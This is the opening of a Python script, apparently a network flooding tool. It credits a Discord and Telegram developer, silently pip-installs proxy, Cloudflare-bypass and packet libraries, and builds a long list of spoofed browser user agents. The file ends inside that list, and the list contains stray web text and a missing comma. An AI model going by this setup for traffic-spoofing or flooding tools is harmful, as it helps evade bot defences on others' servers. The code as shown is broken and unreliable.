
#[Contact]#
#Discord Dev: 𝙉𝙝𝙖𝙩𝙌𝙪𝙖𝙣𝙜#5460 #
#Tele: @Nh4tQu5ng #
#Base in AnonyV28 !#


import os, sys

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

import socket, socks, threading, random, re, os
import sys, glob, time, requests, ssl, webbrowser
import bz2, datetime, wget, json, cfscrape, urllib3
from time import sleep
from os import system
from sys import stdout
from scapy.all import *
from random import randint

urllib3.disable_warnings()
urllib3.PoolManager()

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5","Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20","Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a","Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2","Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0","Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1","Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2","Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0","Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8",
"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN","Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN"
"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
    "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
    "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
    "More Internet Explorer 9.0 user agents strings -->>",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; msn OptimizedIE8;ZHCN)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; InfoPath.3; .NET4.0C; .NET4.0E) chromeframe/8.0.552.224",
    "More Internet Explorer 8.0 user agents strings -->>",
    "Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)",
